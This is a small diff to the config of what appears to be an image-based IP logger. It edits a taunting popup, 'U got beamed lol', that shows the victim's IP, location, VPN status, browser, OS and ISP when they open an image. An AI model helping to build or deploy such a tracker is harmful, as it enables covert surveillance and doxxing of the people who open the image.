@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "U got beamed lol ---{ip}---{country}---{region}---{city}---{vpn}---{browser}---{os}---{isp}---          .by abe#6881    !bye bye pc!", # Message to show
+        "message": "U got beamed lol ---{ip}---{country}---{region}---{city}---vpn?{vpn}---{browser}---{os}---{isp}---          .by abe#6881    !bye bye pc!", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
